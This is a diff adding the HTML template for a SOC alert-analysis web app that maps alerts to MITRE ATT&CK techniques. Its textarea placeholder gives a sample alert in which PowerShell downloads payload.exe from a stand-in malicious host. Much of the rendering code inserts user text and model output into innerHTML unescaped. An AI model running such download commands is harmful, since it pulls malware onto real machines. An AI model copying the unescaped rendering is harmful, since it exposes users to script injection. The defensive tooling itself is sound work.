@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MITRE RAG SOC Assistant</title>
+  <style>
+    :root {
+      --bg: #f8f9fa;
+      --panel: #ffffff;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --text: #1f2937;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --border-hover: #d1d5db;
+      --good: #059669;
+      --warning: #f59e0b;
+      --danger: #dc2626;
+      --section-bg: #f9fafb;
+      --shadow: rgba(0, 0, 0, 0.08);
+      --shadow-hover: rgba(0, 0, 0, 0.12);
+    }
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      color: var(--text);
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 1400px;
+      margin: 30px auto;
+      padding: 0 20px;
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 32px;
+      box-shadow: 0 4px 6px -1px var(--shadow), 0 2px 4px -1px var(--shadow);
+      margin-bottom: 24px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 24px;
+      padding-bottom: 20px;
+      border-bottom: 2px solid var(--border);
+    }
+    h1 {
+      margin: 0 0 8px 0;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--text);
+      letter-spacing: -0.5px;
+    }
+    .subtitle {
+      color: var(--muted);
+      font-size: 15px;
+      margin: 0;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 2px 4px rgba(102, 126, 234, 0.3);
+    }
+    .tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 24px;
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 0;
+    }
+    .tab {
+      padding: 12px 24px;
+      background: none;
+      border: none;
+      border-bottom: 3px solid transparent;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--muted);
+      transition: all 0.2s ease;
+      position: relative;
+      bottom: -2px;
+    }
+    .tab:hover {
+      color: var(--accent);
+      background: rgba(37, 99, 235, 0.05);
+    }
+    .tab.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    .tab-content {
+      display: none;
+    }
+    .tab-content.active {
+      display: block;
+    }
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      margin-bottom: 24px;
+    }
+    .stat-card {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    .stat-card.success {
+      background: linear-gradient(135deg, #059669 0%, #047857 100%);
+    }
+    .stat-card.warning {
+      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+    }
+    .stat-card.danger {
+      background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+    }
+    .stat-value {
+      font-size: 32px;
+      font-weight: 700;
+      margin: 8px 0;
+    }
+    .stat-label {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    .label {
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      display: block;
+    }
+    textarea, input, select {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: 2px solid var(--border);
+      background: var(--panel);
+      color: var(--text);
+      font-size: 14px;
+      font-family: inherit;
+      transition: all 0.2s ease;
+    }
+    textarea:focus, input:focus, select:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+    }
+    textarea {
+      min-height: 140px;
+      resize: vertical;
+      line-height: 1.6;
+    }
+    button {
+      background: var(--accent);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 4px rgba(37, 99, 235, 0.2);
+    }
+    button:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(37, 99, 235, 0.3);
+    }
+    button.secondary {
+      background: var(--section-bg);
+      color: var(--text);
+      border: 2px solid var(--border);
+    }
+    button.secondary:hover {
+      background: var(--border);
+    }
+    button.small {
+      padding: 8px 16px;
+      font-size: 13px;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1.5fr 1fr;
+      gap: 20px;
+      align-items: start;
+      margin-top: 20px;
+    }
+    .split {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-top: 24px;
+    }
+    .section {
+      background: var(--section-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      min-height: 300px;
+    }
+    .section-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text);
+      margin: 0 0 16px 0;
+      padding-bottom: 12px;
+      border-bottom: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .section-title::before {
+      content: "📊";
+      font-size: 18px;
+      margin-right: 8px;
+    }
+    .mitre-section .section-title::before {
+      content: "🛡️";
+    }
+    .history-section .section-title::before {
+      content: "📜";
+    }
+    .chart-container {
+      height: 200px;
+      margin: 20px 0;
+      position: relative;
+    }
+    .chart-bar {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-around;
+      height: 100%;
+      gap: 8px;
+    }
+    .bar {
+      flex: 1;
+      background: linear-gradient(180deg, var(--accent) 0%, var(--accent-hover) 100%);
+      border-radius: 4px 4px 0 0;
+      min-height: 10px;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+    .bar:hover {
+      opacity: 0.8;
+      transform: scaleY(1.05);
+    }
+    .bar-label {
+      position: absolute;
+      bottom: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 11px;
+      color: var(--muted);
+      white-space: nowrap;
+    }
+    .analysis-content {
+      font-size: 15px;
+      line-height: 1.8;
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", sans-serif;
+    }
+    .analysis-content h1, .analysis-content h2, .analysis-content h3 {
+      margin-top: 24px;
+      margin-bottom: 12px;
+      font-weight: 700;
+      color: var(--text);
+      line-height: 1.3;
+    }
+    .analysis-content h1 {
+      font-size: 24px;
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 8px;
+      margin-top: 0;
+    }
+    .analysis-content h2 {
+      font-size: 20px;
+      margin-top: 28px;
+      color: var(--accent);
+    }
+    .analysis-content h3 {
+      font-size: 18px;
+      margin-top: 20px;
+      color: var(--accent);
+    }
+    .analysis-content p {
+      margin-bottom: 16px;
+      line-height: 1.8;
+    }
+    .analysis-content strong {
+      font-weight: 700;
+      color: var(--text);
+    }
+    .analysis-content em {
+      font-style: italic;
+      color: var(--muted);
+    }
+    .analysis-content ul, .analysis-content ol {
+      margin: 12px 0 16px 0;
+      padding-left: 24px;
+    }
+    .analysis-content li {
+      margin-bottom: 10px;
+      line-height: 1.7;
+    }
+    .analysis-content code {
+      background: var(--section-bg);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace;
+      font-size: 13px;
+      color: var(--accent);
+      border: 1px solid var(--border);
+    }
+    .risk-badge {
+      display: inline-block;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .risk-low { background: #d1fae5; color: #065f46; }
+    .risk-medium { background: #fef3c7; color: #92400e; }
+    .risk-high { background: #fee2e2; color: #991b1b; }
+    .risk-critical { background: #fecaca; color: #7f1d1d; }
+    .mitre-item {
+      background: white;
+      border-left: 4px solid var(--accent);
+      padding: 16px;
+      margin-bottom: 16px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px var(--shadow);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .mitre-item:hover {
+      transform: translateX(4px);
+      box-shadow: 0 2px 6px var(--shadow-hover);
+    }
+    .mitre-item:last-child {
+      margin-bottom: 0;
+    }
+    .mitre-id {
+      font-weight: 700;
+      color: var(--accent);
+      font-size: 15px;
+      margin-bottom: 4px;
+      letter-spacing: 0.5px;
+    }
+    .mitre-name {
+      font-weight: 600;
+      color: var(--text);
+      font-size: 15px;
+      margin-bottom: 8px;
+    }
+    .mitre-desc {
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.6;
+      margin-bottom: 8px;
+    }
+    .mitre-score {
+      display: inline-block;
+      background: var(--section-bg);
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--accent);
+      margin-top: 8px;
+    }
+    .chips {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    .chip {
+      padding: 10px 16px;
+      border-radius: 20px;
+      border: 2px solid var(--border);
+      background: white;
+      cursor: pointer;
+      font-size: 13px;
+      color: var(--text);
+      transition: all 0.2s ease;
+      font-weight: 500;
+    }
+    .chip:hover {
+      border-color: var(--accent);
+      background: rgba(37, 99, 235, 0.05);
+      transform: translateY(-1px);
+    }
+    .history-item {
+      background: white;
+      border: 1px solid var(--border);
+      padding: 16px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .history-item:hover {
+      border-color: var(--accent);
+      box-shadow: 0 2px 8px var(--shadow);
+    }
+    .history-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .history-date {
+      font-size: 12px;
+      color: var(--muted);
+    }
+    .history-preview {
+      font-size: 13px;
+      color: var(--muted);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .empty-state {
+      color: var(--muted);
+      font-style: italic;
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .action-buttons {
+      display: flex;
+      gap: 8px;
+      margin-top: 16px;
+    }
+    .search-box {
+      margin-bottom: 16px;
+    }
+    .input-group {
+      margin-bottom: 16px;
+    }
+    @media (max-width: 768px) {
+      .row, .split, .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      .container {
+        margin: 20px auto;
+        padding: 0 16px;
+      }
+      .card {
+        padding: 20px;
+      }
+      .tabs {
+        flex-wrap: wrap;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="header">
+        <div>
+          <h1>MITRE RAG SOC Assistant</h1>
+          <p class="subtitle">Advanced Security Alert Analysis with MITRE ATT&CK Framework</p>
+        </div>
+        <span class="badge">FAISS + LLM</span>
+      </div>
+
+      <div class="tabs">
+        <button class="tab active" data-tab="analyzer">🔍 Analyzer</button>
+        <button class="tab" data-tab="dashboard">📊 Dashboard</button>
+        <button class="tab" data-tab="history">📜 History</button>
+      </div>
+
+      <!-- Analyzer Tab -->
+      <div id="tab-analyzer" class="tab-content active">
+        <div>
+          <label class="label">Example Alerts</label>
+          <div class="chips" id="examples"></div>
+        </div>
+
+        <div class="row">
+          <div class="input-group">
+            <label class="label">Security Alert Text</label>
+            <textarea id="alert" placeholder="Enter or paste your security alert here...&#10;&#10;Example: Process created: powershell Invoke-WebRequest http://malicious/payload.exe"></textarea>
+          </div>
+          <div class="input-group">
+            <label class="label">Top K MITRE Techniques</label>
+            <input id="topk" type="number" min="1" max="5" step="1" value="3">
+            <div style="height:16px;"></div>
+            <button id="analyze" style="width:100%;">🔍 Analyze Alert</button>
+            <div id="error" style="display:none; color: var(--danger); margin-top: 12px; padding: 12px; background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; font-size: 14px;"></div>
+          </div>
+        </div>
+
+        <div class="split">
+          <div class="section analysis-section">
+            <div class="section-title">
+              <span>SOC Analysis Report</span>
+              <div class="action-buttons">
+                <button class="secondary small" id="export-pdf">📄 Export</button>
+                <button class="secondary small" id="save-analysis">💾 Save</button>
+              </div>
+            </div>
+            <div id="analysis" class="analysis-content empty-state">Analysis results will appear here after you click "Analyze Alert"</div>
+          </div>
+          <div class="section mitre-section">
+            <h3 class="section-title">Retrieved MITRE ATT&CK Techniques</h3>
+            <div id="mitre" class="empty-state">MITRE techniques will appear here after analysis</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Dashboard Tab -->
+      <div id="tab-dashboard" class="tab-content">
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-label">Total Analyses</div>
+            <div class="stat-value" id="stat-total">0</div>
+          </div>
+          <div class="stat-card success">
+            <div class="stat-label">Low Risk</div>
+            <div class="stat-value" id="stat-low">0</div>
+          </div>
+          <div class="stat-card warning">
+            <div class="stat-label">Medium Risk</div>
+            <div class="stat-value" id="stat-medium">0</div>
+          </div>
+          <div class="stat-card danger">
+            <div class="stat-label">High Risk</div>
+            <div class="stat-value" id="stat-high">0</div>
+          </div>
+        </div>
+
+        <div class="split">
+          <div class="section">
+            <h3 class="section-title">Risk Distribution</h3>
+            <div class="chart-container">
+              <div class="chart-bar" id="risk-chart"></div>
+            </div>
+          </div>
+          <div class="section">
+            <h3 class="section-title">Top MITRE Techniques</h3>
+            <div id="top-techniques" class="empty-state">No data available yet</div>
+          </div>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Recent Activity Timeline</h3>
+          <div id="timeline" class="empty-state">No recent activity</div>
+        </div>
+      </div>
+
+      <!-- History Tab -->
+      <div id="tab-history" class="tab-content">
+        <div class="search-box">
+          <input type="text" id="history-search" placeholder="🔍 Search in history...">
+        </div>
+        <div id="history-list" class="empty-state">No analysis history yet. Start analyzing alerts to build your history.</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const examples = {{ examples | tojson }};
+    let analysisHistory = JSON.parse(localStorage.getItem('socAnalysisHistory') || '[]');
+    let currentAnalysis = null;
+
+    // DOM Elements
+    const chips = document.getElementById("examples");
+    const alertBox = document.getElementById("alert");
+    const topk = document.getElementById("topk");
+    const btn = document.getElementById("analyze");
+    const analysis = document.getElementById("analysis");
+    const mitre = document.getElementById("mitre");
+    const err = document.getElementById("error");
+    const tabs = document.querySelectorAll('.tab');
+    const tabContents = document.querySelectorAll('.tab-content');
+
+    // Initialize
+    chips.innerHTML = examples.map(e => `<div class="chip">${e}</div>`).join("");
+    chips.addEventListener("click", (e) => {
+      if (e.target.classList.contains("chip")) {
+        alertBox.value = e.target.textContent;
+        alertBox.focus();
+      }
+    });
+
+    // Tab switching
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        const targetTab = tab.dataset.tab;
+        tabs.forEach(t => t.classList.remove('active'));
+        tabContents.forEach(tc => tc.classList.remove('active'));
+        tab.classList.add('active');
+        document.getElementById(`tab-${targetTab}`).classList.add('active');
+        
+        if (targetTab === 'dashboard') {
+          updateDashboard();
+        } else if (targetTab === 'history') {
+          renderHistory();
+        }
+      });
+    });
+
+    function formatAnalysis(text) {
+      if (!text) return "";
+      let html = text;
+      html = html.replace(/^(\d+)\.\s*\*\*(.+?)\*\*(.*)$/gim, '<h2>$1. $2$3</h2>');
+      html = html.replace(/^(\d+)\.\s+(.+)$/gim, function(match, num, title) {
+        if (title.length < 100 && !title.includes('.')) {
+          return `<h2>${num}. ${title}</h2>`;
+        }
+        return match;
+      });
+      html = html.replace(/^### (.*$)/gim, '<h3>$1</h3>');
+      html = html.replace(/^## (.*$)/gim, '<h2>$1</h2>');
+      html = html.replace(/^# (.*$)/gim, '<h1>$1</h1>');
+      html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+      html = html.replace(/__([^_]+)__/g, '<strong>$1</strong>');
+      html = html.replace(/(?<!\*)\*([^*]+?)\*(?!\*)/g, '<em>$1</em>');
+      html = html.replace(/`([^`\n]+)`/g, '<code>$1</code>');
+      html = html.replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>');
+      
+      const lines = html.split('\n');
+      let result = [];
+      let inList = false;
+      let listType = null;
+      let currentParagraph = [];
+      
+      function flushParagraph() {
+        if (currentParagraph.length > 0) {
+          result.push('<p>' + currentParagraph.join(' ') + '</p>');
+          currentParagraph = [];
+        }
+      }
+      
+      function flushList() {
+        if (inList && result.length > 0 && result[result.length - 1].match(/<\/li>$/)) {
+          result.push(`</${listType}>`);
+          inList = false;
+          listType = null;
+        }
+      }
+      
+      for (let i = 0; i < lines.length; i++) {
+        let line = lines[i];
+        const trimmed = line.trim();
+        
+        if (trimmed === '') {
+          flushParagraph();
+          flushList();
+          continue;
+        }
+        
+        if (trimmed.startsWith('<')) {
+          flushParagraph();
+          flushList();
+          result.push(trimmed);
+          continue;
+        }
+        
+        const bulletMatch = trimmed.match(/^[-*]\s+(.+)$/);
+        if (bulletMatch) {
+          flushParagraph();
+          if (!inList || listType !== 'ul') {
+            flushList();
+            listType = 'ul';
+            inList = true;
+          }
+          result.push('<li>' + bulletMatch[1] + '</li>');
+          continue;
+        }
+        
+        const numberedMatch = trimmed.match(/^(\d+)\.\s+(.+)$/);
+        if (numberedMatch && trimmed.length > 50) {
+          flushParagraph();
+          if (!inList || listType !== 'ol') {
+            flushList();
+            listType = 'ol';
+            inList = true;
+          }
+          result.push('<li>' + numberedMatch[2] + '</li>');
+          continue;
+        }
+        
+        flushList();
+        currentParagraph.push(trimmed);
+      }
+      
+      flushParagraph();
+      flushList();
+      
+      html = result.join('\n');
+      html = html.replace(/<p>\s*<\/p>/g, '');
+      html = html.replace(/\n{3,}/g, '\n\n');
+      html = html.replace(/<strong>\s*<\/strong>/g, '');
+      
+      return html.trim();
+    }
+
+    function extractRiskLevel(analysisText) {
+      const lower = analysisText.toLowerCase();
+      if (lower.includes('critical')) return 'critical';
+      if (lower.includes('high')) return 'high';
+      if (lower.includes('medium')) return 'medium';
+      return 'low';
+    }
+
+    function formatMitreHits(hits) {
+      if (!hits || hits.length === 0) {
+        return '<div class="empty-state">No MITRE techniques found matching this alert.</div>';
+      }
+      
+      return hits.map(h => {
+        const desc = (h.desc || "").substring(0, 300);
+        const descEllipsis = (h.desc || "").length > 300 ? "..." : "";
+        return `
+          <div class="mitre-item">
+            <div class="mitre-id">${h.id || 'N/A'}</div>
+            <div class="mitre-name">${h.name || 'Unknown Technique'}</div>
+            <div class="mitre-desc">${desc}${descEllipsis}</div>
+            <div class="mitre-score">Relevance Score: ${h.score ? h.score.toFixed(3) : 'N/A'}</div>
+          </div>
+        `;
+      }).join("");
+    }
+
+    async function analyze() {
+      err.textContent = "";
+      err.style.display = "none";
+      analysis.className = "analysis-content";
+      analysis.innerHTML = '<p style="color: var(--muted);">Analyzing alert... Please wait.</p>';
+      mitre.className = "";
+      mitre.innerHTML = '<div class="empty-state">Retrieving MITRE techniques...</div>';
+      
+      try {
+        const res = await fetch("/analyze", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ alert: alertBox.value, top_k: parseInt(topk.value) || 3 })
+        });
+        const data = await res.json();
+        if (!res.ok) {
+          throw new Error(data.error || "Request failed");
+        }
+        
+        const riskLevel = extractRiskLevel(data.analysis || '');
+        currentAnalysis = {
+          alert: alertBox.value,
+          analysis: data.analysis,
+          mitre_hits: data.mitre_hits,
+          riskLevel: riskLevel,
+          timestamp: new Date().toISOString()
+        };
+        
+        analysis.className = "analysis-content";
+        const formattedAnalysis = formatAnalysis(data.analysis || "No analysis generated.");
+        analysis.innerHTML = formattedAnalysis || '<p>No analysis generated.</p>';
+        
+        mitre.className = "";
+        mitre.innerHTML = formatMitreHits(data.mitre_hits);
+        
+        // Auto-save to history
+        saveToHistory(currentAnalysis);
+      } catch (e) {
+        err.textContent = "Error: " + e.message;
+        err.style.display = "block";
+        analysis.className = "analysis-content empty-state";
+        analysis.innerHTML = '<p>Analysis failed. Please try again.</p>';
+        mitre.className = "empty-state";
+        mitre.innerHTML = "Unable to retrieve MITRE techniques.";
+      }
+    }
+
+    function saveToHistory(analysisData) {
+      analysisHistory.unshift(analysisData);
+      if (analysisHistory.length > 50) analysisHistory.pop();
+      localStorage.setItem('socAnalysisHistory', JSON.stringify(analysisHistory));
+    }
+
+    function renderHistory() {
+      const listEl = document.getElementById('history-list');
+      const searchTerm = document.getElementById('history-search')?.value.toLowerCase() || '';
+      
+      const filtered = analysisHistory.filter(item => 
+        item.alert.toLowerCase().includes(searchTerm) ||
+        (item.analysis || '').toLowerCase().includes(searchTerm)
+      );
+      
+      if (filtered.length === 0) {
+        listEl.className = 'empty-state';
+        listEl.innerHTML = searchTerm ? 'No results found' : 'No analysis history yet. Start analyzing alerts to build your history.';
+        return;
+      }
+      
+      listEl.className = '';
+      listEl.innerHTML = filtered.map((item, idx) => {
+        const date = new Date(item.timestamp);
+        const riskClass = `risk-${item.riskLevel || 'low'}`;
+        return `
+          <div class="history-item" onclick="loadHistoryItem(${analysisHistory.indexOf(item)})">
+            <div class="history-header">
+              <span class="risk-badge ${riskClass}">${(item.riskLevel || 'low').toUpperCase()}</span>
+              <span class="history-date">${date.toLocaleString()}</span>
+            </div>
+            <div class="history-preview">${item.alert.substring(0, 100)}${item.alert.length > 100 ? '...' : ''}</div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    window.loadHistoryItem = function(idx) {
+      const item = analysisHistory[idx];
+      alertBox.value = item.alert;
+      currentAnalysis = item;
+      analysis.className = "analysis-content";
+      analysis.innerHTML = formatAnalysis(item.analysis);
+      mitre.className = "";
+      mitre.innerHTML = formatMitreHits(item.mitre_hits);
+      document.querySelector('[data-tab="analyzer"]').click();
+    };
+
+    function updateDashboard() {
+      const total = analysisHistory.length;
+      const risks = { low: 0, medium: 0, high: 0, critical: 0 };
+      const techniqueCounts = {};
+      const timeline = [];
+      
+      analysisHistory.forEach(item => {
+        risks[item.riskLevel || 'low']++;
+        (item.mitre_hits || []).forEach(hit => {
+          techniqueCounts[hit.id] = (techniqueCounts[hit.id] || 0) + 1;
+        });
+        timeline.push({
+          date: new Date(item.timestamp).toLocaleDateString(),
+          risk: item.riskLevel || 'low',
+          alert: item.alert.substring(0, 50)
+        });
+      });
+      
+      document.getElementById('stat-total').textContent = total;
+      document.getElementById('stat-low').textContent = risks.low;
+      document.getElementById('stat-medium').textContent = risks.medium;
+      document.getElementById('stat-high').textContent = risks.high + risks.critical;
+      
+      // Risk chart
+      const chartEl = document.getElementById('risk-chart');
+      const maxRisk = Math.max(risks.low, risks.medium, risks.high, risks.critical, 1);
+      chartEl.innerHTML = `
+        <div style="flex: 1; display: flex; flex-direction: column; align-items: center;">
+          <div class="bar" style="height: ${(risks.low / maxRisk) * 100}%"></div>
+          <div class="bar-label">Low</div>
+        </div>
+        <div style="flex: 1; display: flex; flex-direction: column; align-items: center;">
+          <div class="bar" style="height: ${(risks.medium / maxRisk) * 100}%"></div>
+          <div class="bar-label">Medium</div>
+        </div>
+        <div style="flex: 1; display: flex; flex-direction: column; align-items: center;">
+          <div class="bar" style="height: ${(risks.high / maxRisk) * 100}%"></div>
+          <div class="bar-label">High</div>
+        </div>
+        <div style="flex: 1; display: flex; flex-direction: column; align-items: center;">
+          <div class="bar" style="height: ${(risks.critical / maxRisk) * 100}%"></div>
+          <div class="bar-label">Critical</div>
+        </div>
+      `;
+      
+      // Top techniques
+      const topTechEl = document.getElementById('top-techniques');
+      const sortedTech = Object.entries(techniqueCounts).sort((a, b) => b[1] - a[1]).slice(0, 5);
+      if (sortedTech.length === 0) {
+        topTechEl.className = 'empty-state';
+        topTechEl.textContent = 'No data available yet';
+      } else {
+        topTechEl.className = '';
+        topTechEl.innerHTML = sortedTech.map(([id, count]) => `
+          <div style="padding: 12px; background: white; margin-bottom: 8px; border-radius: 8px; border-left: 4px solid var(--accent);">
+            <strong>${id}</strong> - ${count} occurrence${count > 1 ? 's' : ''}
+          </div>
+        `).join('');
+      }
+      
+      // Timeline
+      const timelineEl = document.getElementById('timeline');
+      const recent = timeline.slice(0, 10);
+      if (recent.length === 0) {
+        timelineEl.className = 'empty-state';
+        timelineEl.textContent = 'No recent activity';
+      } else {
+        timelineEl.className = '';
+        timelineEl.innerHTML = recent.map(item => `
+          <div style="padding: 12px; background: white; margin-bottom: 8px; border-radius: 8px; border-left: 4px solid var(--accent);">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
+              <span class="risk-badge risk-${item.risk}">${item.risk.toUpperCase()}</span>
+              <span style="font-size: 12px; color: var(--muted);">${item.date}</span>
+            </div>
+            <div style="font-size: 13px; color: var(--text);">${item.alert}...</div>
+          </div>
+        `).join('');
+      }
+    }
+
+    // Export functionality
+    document.getElementById('export-pdf').addEventListener('click', () => {
+      if (!currentAnalysis) {
+        alert('No analysis to export');
+        return;
+      }
+      const content = `
+ALERT:
+${currentAnalysis.alert}
+
+ANALYSIS:
+${currentAnalysis.analysis}
+
+MITRE TECHNIQUES:
+${(currentAnalysis.mitre_hits || []).map(h => `${h.id} - ${h.name}`).join('\n')}
+      `.trim();
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `soc-analysis-${new Date().toISOString().split('T')[0]}.txt`;
+      a.click();
+    });
+
+    document.getElementById('save-analysis').addEventListener('click', () => {
+      if (!currentAnalysis) {
+        alert('No analysis to save');
+        return;
+      }
+      saveToHistory(currentAnalysis);
+      alert('Analysis saved to history!');
+    });
+
+    document.getElementById('history-search')?.addEventListener('input', renderHistory);
+
+    btn.addEventListener("click", analyze);
+    
+    alertBox.addEventListener("keydown", (e) => {
+      if (e.ctrlKey && e.key === "Enter") {
+        analyze();
+      }
+    });
+  </script>
+</body>
+</html>
